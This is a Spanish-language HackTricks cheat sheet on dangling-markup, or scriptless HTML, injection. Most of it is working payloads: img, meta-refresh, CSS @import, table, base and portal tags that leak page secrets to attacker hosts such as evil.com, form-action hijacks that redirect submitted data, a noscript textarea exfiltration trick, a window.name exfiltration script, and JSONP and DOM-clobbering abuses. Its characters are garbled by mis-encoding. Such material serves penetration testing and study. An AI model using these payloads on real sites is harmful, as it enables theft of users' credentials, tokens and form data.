# Dangling Markup - Inyecci√≥n HTML sin script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Resumen

Esta t√©cnica se puede utilizar para extraer informaci√≥n de un usuario cuando se encuentra una **inyecci√≥n HTML**. Esto es muy √∫til si **no encuentras ninguna forma de explotar un** [**XSS** ](../xss-cross-site-scripting/)pero puedes **inyectar algunas etiquetas HTML**.\
Tambi√©n es √∫til si alg√∫n **secreto se guarda en texto claro** en el HTML y quieres **extraerlo** del cliente, o si quieres enga√±ar la ejecuci√≥n de alg√∫n script.

Varias t√©cnicas comentadas aqu√≠ se pueden utilizar para evadir algunas [**Pol√≠ticas de Seguridad de Contenido**](../content-security-policy-csp-bypass/) al extraer informaci√≥n de formas inesperadas (etiquetas html, CSS, etiquetas http-meta, formularios, base...).

## Principales Aplicaciones

### Robo de secretos en texto claro

Si inyectas `<img src='http://evil.com/log.cgi?` cuando se carga la p√°gina, la v√≠ctima te enviar√° todo el c√≥digo entre la etiqueta `img` inyectada y la siguiente comilla dentro del c√≥digo. Si alg√∫n secreto se encuentra en ese fragmento, lo robar√°s (puedes hacer lo mismo usando comillas dobles, mira cu√°l podr√≠a ser m√°s interesante de usar).

Si la etiqueta `img` est√° prohibida (debido a la Pol√≠tica de Seguridad de Contenido, por ejemplo), tambi√©n puedes usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Ten en cuenta que **Chrome bloquea las URL HTTP** con "<" o "\n" en ellas, por lo que podr√≠as intentar otros esquemas de protocolo como "ftp".

Tambi√©n puedes abusar de CSS `@import` (enviar√° todo el c√≥digo hasta que encuentre un ";")
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Tambi√©n puedes usar **`<table`**:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Tambi√©n puedes insertar una etiqueta `<base`. Toda la informaci√≥n se enviar√° hasta que se cierre la comilla, pero requiere interacci√≥n del usuario (el usuario debe hacer clic en alg√∫n enlace, ya que la etiqueta base habr√° cambiado el dominio al que apunta el enlace):
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Robando formularios

En algunos casos, los atacantes pueden aprovechar las vulnerabilidades de seguridad en un sitio web para robar informaci√≥n de los formularios enviados por los usuarios. Esto se conoce como robo de formularios y puede ser utilizado para obtener datos confidenciales, como nombres de usuario, contrase√±as o informaci√≥n de tarjetas de cr√©dito.

Una t√©cnica com√∫n para robar formularios es la inyecci√≥n de c√≥digo sin secuencias de comandos en el marcado HTML. Esto implica aprovechar las vulnerabilidades en el c√≥digo del sitio web para insertar c√≥digo malicioso en los campos de entrada del formulario. Cuando un usuario env√≠a el formulario, el c√≥digo malicioso se ejecuta y env√≠a los datos ingresados a un servidor controlado por el atacante.

Para llevar a cabo un robo de formularios, los atacantes pueden utilizar diversas t√©cnicas, como la inyecci√≥n de c√≥digo en campos de entrada, la manipulaci√≥n de solicitudes HTTP o la explotaci√≥n de vulnerabilidades en el servidor web. Es importante que los desarrolladores y administradores de sitios web implementen medidas de seguridad adecuadas, como la validaci√≥n de entrada y la protecci√≥n contra ataques de inyecci√≥n de c√≥digo, para prevenir este tipo de ataques.
```markup
<base href='http://evil.com/'>
```
Entonces, los formularios que env√≠an datos a una ruta (como `<form action='update_profile.php'>`) enviar√°n los datos al dominio malicioso.

### Robando formularios 2

Establece una cabecera de formulario: `<form action='http://evil.com/log_steal'>` esto sobrescribir√° la siguiente cabecera de formulario y todos los datos del formulario ser√°n enviados al atacante.

### Robando formularios 3

El bot√≥n puede cambiar la URL a donde se enviar√° la informaci√≥n del formulario con el atributo "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un atacante puede utilizar esto para robar la informaci√≥n.

### Robando secretos en texto claro 2

Utilizando la t√©cnica mencionada anteriormente para robar formularios (inyectando una nueva cabecera de formulario), luego puedes inyectar un nuevo campo de entrada:
```markup
<input type='hidden' name='review_body' value="
```
y este campo de entrada contendr√° todo el contenido entre sus comillas dobles y las siguientes comillas dobles en el HTML. Este ataque combina "_**Robo de secretos en texto claro**_" con "_**Robo de formularios2**_".

Puedes hacer lo mismo inyectando un formulario y una etiqueta `<option>`. Todos los datos hasta que se encuentre un `</option>` cerrado ser√°n enviados:
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Inyecci√≥n de par√°metros de formulario

Puedes cambiar la ruta de un formulario e insertar nuevos valores para que se realice una acci√≥n inesperada:
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Robando secretos en texto claro a trav√©s de noscript

`<noscript></noscript>` es una etiqueta cuyo contenido se interpretar√° si el navegador no admite JavaScript (puedes habilitar/deshabilitar JavaScript en Chrome en [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Una forma de extraer el contenido de la p√°gina web desde el punto de inyecci√≥n hasta el final hacia un sitio controlado por el atacante ser√° inyectando lo siguiente:
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassando CSP con interacci√≥n del usuario

Desde esta [investigaci√≥n de portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) puedes aprender que incluso en los entornos **m√°s restringidos por CSP** a√∫n puedes **filtrar datos** con algo de **interacci√≥n del usuario**. En esta ocasi√≥n vamos a utilizar el payload:
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Ten en cuenta que le pedir√°s al **v√≠ctima** que **haga clic en un enlace** que lo redirigir√° a un **payload** controlado por ti. Tambi√©n ten en cuenta que el atributo **`target`** dentro de la etiqueta **`base`** contendr√° **contenido HTML** hasta la siguiente comilla simple.\
Esto har√° que el **valor** de **`window.name`** cuando se haga clic en el enlace sea todo ese **contenido HTML**. Por lo tanto, como **controlas la p√°gina** a la que accede la v√≠ctima al hacer clic en el enlace, puedes acceder a ese **`window.name`** y **filtrar** esos datos:
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flujo de trabajo enga√±oso 1 - Ataque de espacio de nombres HTML

Inserta una nueva etiqueta con un id dentro del HTML que sobrescribir√° la siguiente y con un valor que afectar√° el flujo de un script. En este ejemplo est√°s seleccionando con qui√©n se compartir√° la informaci√≥n:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flujo de trabajo enga√±oso de script 2 - Ataque de espacio de nombres de script

Crea variables dentro del espacio de nombres de JavaScript insertando etiquetas HTML. Luego, esta variable afectar√° el flujo de la aplicaci√≥n:
```markup
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abuso de JSONP

Si encuentras una interfaz JSONP, podr√≠as ser capaz de llamar a una funci√≥n arbitraria con datos arbitrarios:
```markup
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
O incluso puedes intentar ejecutar algo de javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abuso de Iframe

Ten en cuenta que un **documento secundario puede ver y establecer la propiedad de ubicaci√≥n para el padre, incluso si es de origen cruzado.** Esto significa que puedes hacer que el cliente acceda a cualquier otra p√°gina cargando dentro de un **iframe** alg√∫n c√≥digo como:
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Esto se puede mitigar con algo como: _**sandbox=‚Äô allow-scripts allow-top-navigation‚Äô**_

Un iframe tambi√©n puede ser utilizado para filtrar informaci√≥n sensible de una p√°gina diferente **utilizando el atributo name del iframe**. Esto se debe a que puedes crear un iframe que se iframe a s√≠ mismo aprovechando la inyecci√≥n de HTML que hace que la **informaci√≥n sensible aparezca dentro del atributo name del iframe** y luego acceder a ese nombre desde el iframe inicial y filtrarlo.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Para obtener m√°s informaci√≥n, consulta [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuso

Puedes usar **`meta http-equiv`** para realizar **varias acciones** como establecer una Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` o realizar una redirecci√≥n (en 5s en este caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Esto se puede **evitar** con una **CSP** en relaci√≥n a **http-equiv** (`Content-Security-Policy: default-src 'self';`, o `Content-Security-Policy: http-equiv 'self';`)

### Nuevo etiqueta HTML \<portal

Puedes encontrar una investigaci√≥n muy **interesante** sobre vulnerabilidades explotables de la etiqueta \<portal [aqu√≠](https://research.securitum.com/security-analysis-of-portal-element/).\
En el momento de escribir esto, debes habilitar la etiqueta portal en Chrome en `chrome://flags/#enable-portals` o no funcionar√°.
```markup
<portal src='https://attacker-server?
```
### Fugas de HTML

No todas las formas de filtrar la conectividad en HTML ser√°n √∫tiles para Dangling Markup, pero a veces podr√≠a ayudar. Compru√©balas aqu√≠: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Fugas de SS

Esto es una **combinaci√≥n** entre **dangling markup y XS-Leaks**. Por un lado, la vulnerabilidad permite **inyectar HTML** (pero no JS) en una p√°gina de la **misma origen** que la que atacaremos. Por otro lado, no **atacaremos** directamente la p√°gina donde podemos inyectar HTML, sino **otra p√°gina**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search est√° orientado a **filtrar informaci√≥n entre or√≠genes cruzados** abusando de **ataques de canal lateral**. Por lo tanto, es una t√©cnica diferente a Dangling Markup, sin embargo, algunas de las t√©cnicas abusan de la inclusi√≥n de etiquetas HTML (con y sin ejecuci√≥n de JS), como [**Inyecci√≥n de CSS**](../xs-search.md#css-injection) o [**Carga diferida de im√°genes**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Lista de detecci√≥n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Referencias

Todas las t√©cnicas presentadas aqu√≠ y m√°s se pueden revisar con m√°s detalles en:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

Otras etiquetas HTML que se pueden abusar se pueden encontrar aqu√≠:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

M√°s informaci√≥n:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
